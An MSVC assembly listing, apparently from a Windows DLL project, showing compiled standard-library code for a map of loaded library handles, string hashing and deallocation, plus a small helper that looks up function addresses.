??$insert@U?$pair@PEBDPEAUHINSTANCE__@@@std@@$0A@@?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA?AU?$pair@V?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@_N@1@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@1@@Z PROC ; std::unordered_map<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::insert<std::pair<char const *,HINSTANCE__ *>,0>, COMDAT

; 270  :     pair<iterator, bool> insert(_Valty&& _Val) {

$LN4:
	push	rbx
	sub	rsp, 32					; 00000020H
	mov	rbx, rdx

; 271  :         return this->emplace(_STD forward<_Valty>(_Val));

	call	??$emplace@U?$pair@PEBDPEAUHINSTANCE__@@@std@@@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA?AU?$pair@V?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@_N@1@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@1@@Z ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::emplace<std::pair<char const *,HINSTANCE__ *> >
	mov	rax, rbx

; 272  :     }

	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
??$insert@U?$pair@PEBDPEAUHINSTANCE__@@@std@@$0A@@?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA?AU?$pair@V?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@_N@1@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@1@@Z ENDP ; std::unordered_map<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::insert<std::pair<char const *,HINSTANCE__ *>,0>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
;	COMDAT ??$_Erase@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@AEAA_KAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z
_TEXT	SEGMENT
$T1 = 32
this$dead$ = 64
_Keyval$ = 72
??$_Erase@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@AEAA_KAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z PROC ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Erase<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >, COMDAT

; 1102 :     size_type _Erase(const _Keytype& _Keyval) noexcept(_Noexcept_heterogeneous_erasure<_Keytype>()) /* strengthened */ {

$LN167:
	mov	QWORD PTR [rsp+8], rbx
	push	rdi
	sub	rsp, 48					; 00000030H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [rdx+24], 15

; 2235 :         const value_type* _Result = _Bx._Buf;

	mov	r8, rdx

; 5176 :         return _Hash_array_representation(_Keyval.c_str(), _Keyval.size());

	mov	r9, QWORD PTR [rdx+16]

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN18@Erase

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	r8, QWORD PTR [rdx]
$LN18@Erase:

; 5176 :         return _Hash_array_representation(_Keyval.c_str(), _Keyval.size());

	xor	ecx, ecx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits

; 2333 :     return _Fnv1a_append_bytes(

	mov	rdi, -3750763034362895579		; cbf29ce484222325H

; 2300 :     for (size_t _Idx = 0; _Idx < _Count; ++_Idx) {

	test	r9, r9
	je	SHORT $LN29@Erase
	mov	r10, 1099511628211			; 00000100000001b3H
	npad	10
$LL151@Erase:

; 2301 :         _Val ^= static_cast<size_t>(_First[_Idx]);

	movzx	eax, BYTE PTR [r8+rcx]
	inc	rcx
	xor	rdi, rax

; 2302 :         _Val *= _FNV_prime;

	imul	rdi, r10
	cmp	rcx, r9
	jb	SHORT $LL151@Erase
$LN29@Erase:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1109 :             const auto _Target = _Find_last(_Keyval, _Hashval)._Duplicate;

	mov	r8, rdx
	mov	r9, rdi
	lea	rdx, QWORD PTR $T1[rsp]
	call	??$_Find_last@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEBA?AU?$_Hash_find_last_result@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@_K@Z ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Find_last<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >
	mov	rbx, QWORD PTR [rax+8]

; 1110 :             if (_Target) {

	test	rbx, rbx
	je	$LN2@Erase

; 1111 :                 _Erase_bucket(_Target, _Hashval & _Mask);

	mov	rdx, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+48
	and	rdx, rdi

; 1663 :         _Nodeptr& _Bucket_lo = _Vec._Mypair._Myval2._Myfirst[_Bucket << 1]._Ptr;

	shl	rdx, 4
	add	rdx, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+24

; 1664 :         _Nodeptr& _Bucket_hi = _Vec._Mypair._Myval2._Myfirst[(_Bucket << 1) + 1]._Ptr;
; 1665 :         if (_Bucket_hi == _Plist) {

	mov	rax, QWORD PTR [rdx]
	cmp	QWORD PTR [rdx+8], rbx
	jne	SHORT $LN34@Erase

; 1666 :             if (_Bucket_lo == _Plist) { // make bucket empty

	cmp	rax, rbx
	jne	SHORT $LN36@Erase

; 1667 :                 const auto _End = _List._Mypair._Myval2._Myhead;

	mov	rax, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+8

; 1668 : 
; 1669 :                 _Bucket_lo = _End;

	mov	QWORD PTR [rdx], rax

; 1673 :             }

	mov	QWORD PTR [rdx+8], rax
	jmp	SHORT $LN38@Erase
$LN36@Erase:

; 1670 :                 _Bucket_hi = _End;
; 1671 :             } else {
; 1672 :                 _Bucket_hi = _Plist->_Prev; // move end back one element

	mov	rax, QWORD PTR [rbx+8]

; 1673 :             }

	mov	QWORD PTR [rdx+8], rax
	jmp	SHORT $LN38@Erase
$LN34@Erase:

; 1674 :         } else if (_Bucket_lo == _Plist) {

	cmp	rax, rbx
	jne	SHORT $LN38@Erase

; 1675 :             _Bucket_lo = _Plist->_Next; // move beginning up one element

	mov	rax, QWORD PTR [rbx]
	mov	QWORD PTR [rdx], rax
$LN38@Erase:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 1423 :         const auto _Result = _Pnode->_Next;

	mov	rcx, QWORD PTR [rbx]

; 1424 :         _Mypair._Myval2._Orphan_ptr2(_Pnode);
; 1425 :         --_Mypair._Myval2._Mysize;

	dec	QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+16

; 1426 :         _Pnode->_Prev->_Next = _Result;

	mov	rax, QWORD PTR [rbx+8]
	mov	QWORD PTR [rax], rcx

; 1427 :         _Result->_Prev       = _Pnode->_Prev;

	mov	rax, QWORD PTR [rbx+8]
	mov	QWORD PTR [rcx+8], rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR [rbx+40]
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN78@Erase
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR [rbx+16]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN92@Erase

; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]
	add	rdx, 39					; 00000027H

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	SHORT $LN89@Erase

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN92@Erase:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN78@Erase:
	mov	edx, 56					; 00000038H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4875 :         _My_data._Mysize = 0;

	mov	QWORD PTR [rbx+32], 0
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 258  :         ::operator delete(_Ptr, _Bytes);

	mov	rcx, rbx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4876 :         _My_data._Myres  = _Small_string_capacity;

	mov	QWORD PTR [rbx+40], 15

; 4877 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4878 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	BYTE PTR [rbx+16], 0
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1113 :                 return 1;

	mov	eax, 1

; 1118 :     }

	mov	rbx, QWORD PTR [rsp+64]
	add	rsp, 48					; 00000030H
	pop	rdi
	ret	0
$LN2@Erase:
	mov	rbx, QWORD PTR [rsp+64]
	xor	eax, eax
	add	rsp, 48					; 00000030H
	pop	rdi
	ret	0
$LN89@Erase:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN164@Erase:
??$_Erase@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@AEAA_KAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z ENDP ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Erase<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
;	COMDAT ??$?RV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@QEBA_KAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z
_TEXT	SEGMENT
this$dead$ = 8
_Keyval$ = 16
??$?RV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@QEBA_KAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z PROC ; std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >::operator()<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >, COMDAT
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [rdx+24], 15

; 5176 :         return _Hash_array_representation(_Keyval.c_str(), _Keyval.size());

	mov	r9, QWORD PTR [rdx+16]

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN14@operator

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	rdx, QWORD PTR [rdx]
$LN14@operator:

; 5176 :         return _Hash_array_representation(_Keyval.c_str(), _Keyval.size());

	xor	r8d, r8d
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits

; 2333 :     return _Fnv1a_append_bytes(

	mov	rax, -3750763034362895579		; cbf29ce484222325H

; 2300 :     for (size_t _Idx = 0; _Idx < _Count; ++_Idx) {

	test	r9, r9
	je	SHORT $LN35@operator
	mov	r10, 1099511628211			; 00000100000001b3H
	npad	6
$LL31@operator:

; 2301 :         _Val ^= static_cast<size_t>(_First[_Idx]);

	movzx	ecx, BYTE PTR [rdx+r8]
	inc	r8
	xor	rax, rcx

; 2302 :         _Val *= _FNV_prime;

	imul	rax, r10
	cmp	r8, r9
	jb	SHORT $LL31@operator
$LN35@operator:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 146  :     }

	ret	0
??$?RV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@QEBA_KAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z ENDP ; std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >::operator()<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
;	COMDAT ??$GetFunctionAddress@P6AHPEAX@Z@ProcessUtilities@@YAP6AHPEAX@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
_TEXT	SEGMENT
$T1 = 40
proc$GSCopy$ = 72
__$ArrayPad$ = 80
lib$ = 112
proc$ = 120
??$GetFunctionAddress@P6AHPEAX@Z@ProcessUtilities@@YAP6AHPEAX@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z PROC ; ProcessUtilities::GetFunctionAddress<int (__cdecl*)(void *)>, COMDAT

; 68   : 	fpType GetFunctionAddress(HMODULE lib, std::string proc) {

$LN46:
	mov	QWORD PTR [rsp+24], rbx
	push	rdi
	sub	rsp, 96					; 00000060H
	mov	rax, QWORD PTR __security_cookie
	xor	rax, rsp
	mov	QWORD PTR __$ArrayPad$[rsp], rax
	mov	rdi, rdx
	mov	rbx, rcx
	mov	QWORD PTR proc$GSCopy$[rsp], rdx

; 69   : 		return reinterpret_cast< fpType >( _GetFuncAddress(lib, proc) );

	lea	rcx, QWORD PTR $T1[rsp]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rdx, rax
	mov	rcx, rbx
	call	?_GetFuncAddress@ProcessUtilities@@YAP6A_JXZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ; ProcessUtilities::_GetFuncAddress
	mov	rbx, rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR [rdi+24]
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN22@GetFunctio

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR [rdi]

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN36@GetFunctio

; 171  :     _Bytes += _Non_user_size;

	add	rdx, 39					; 00000027H

; 172  : 
; 173  :     const uintptr_t* const _Ptr_user = static_cast<uintptr_t*>(_Ptr);
; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

